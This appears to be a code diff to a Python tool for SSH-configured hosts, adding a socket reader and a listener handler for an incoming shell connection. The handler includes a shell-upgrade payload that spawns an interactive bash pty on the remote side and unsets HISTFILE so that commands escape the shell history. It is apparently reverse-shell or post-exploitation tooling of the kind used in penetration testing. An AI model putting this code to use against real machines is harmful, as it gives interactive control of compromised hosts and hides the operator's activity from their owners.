@@ -8,7 +8,9 @@ from pathlib import Path
 from os import path
 import os
 import shlex
+import time
 import subprocess
+import socket
 import logging
 logger = logging.getLogger(__name__)
 
@@ -22,12 +24,14 @@ def host_lookup(name):
     else:
         return None
 
+
 def hostname_lookup(ip, user):
     for ident in HOSTS:
         if ip == ident.HostName and user == ident.User:
             return ident
     else:
         return None
+
 
 def load_config():
     global HOSTS
@@ -44,6 +48,7 @@ def load_config():
             HOSTS.append(host)
     except ssh_config.client.EmptySSHConfig:
         pass
+
 
 def socket_create(host):
     if host is None:
@@ -88,6 +93,7 @@ def socket_cmd(host, request, cmd=''):
         logger.debug(str(e))
         return False
 
+
 def execute(cmd, host):
     if host is None:
         return
@@ -109,3 +115,51 @@ def execute(cmd, host):
         output = str(e).encode()
 
     return output
+
+
+def recv_timeout(sock, cmd=None):
+    sock.setblocking(0)
+    recv_data = ''
+    buf = ''
+    begin = time.time()
+
+    while True:
+        # wait a sec
+        if recv_data and time.time() - begin > 1:
+            break
+        # there's no data, so wait 2s
+        elif time.time() - begin > 2:
+            break
+        try:
+            buf = sock.recv(1024)
+            if buf and buf != cmd:
+                recv_data += buf.decode()
+                begin = time.time()
+            else:
+                time.sleep(0.1)
+        except socket.error as e:
+            if not e.errno == 11:
+                raise
+    return recv_data
+
+
+def listener_handler(conn):
+    sys.stdout.write(recv_timeout(conn))
+    sys.stdout.flush()
+    while True:
+        send_data = sys.stdin.readline().encode()
+        if send_data:
+            if send_data == b'!pty\n':
+                orig_tty = subprocess.check_output(shlex.split('stty -g'))
+                tty_val = subprocess.check_output(shlex.split('stty -a')).split(b';')
+                rows = int(tty_val[1].split()[-1])
+                columns = int(tty_val[2].split()[-1])
+                send_data = f"stty raw -echo; (echo unset HISTFILE; echo export TERM={os.environ['TERM']}; echo stty rows {rows} columns {columns}; echo reset; cat) | python -c 'import pty; pty.spawn(\"/bin/bash\");exit()'\n".encode()
+            conn.sendall(send_data)
+            if send_data == b'exit\n':
+                break
+        else:
+            continue
+        sys.stdout.write(recv_timeout(conn, send_data))
+        sys.stdout.flush()
+    conn.close()
